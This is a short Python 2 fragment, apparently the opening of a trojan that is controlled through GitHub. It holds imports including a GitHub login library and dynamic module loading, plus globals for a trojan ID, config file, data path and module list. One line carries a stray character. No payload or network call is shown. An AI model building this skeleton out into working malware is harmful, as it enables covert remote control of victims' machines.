import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
from github3 import login

u trojan_id = "abc"
trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue()
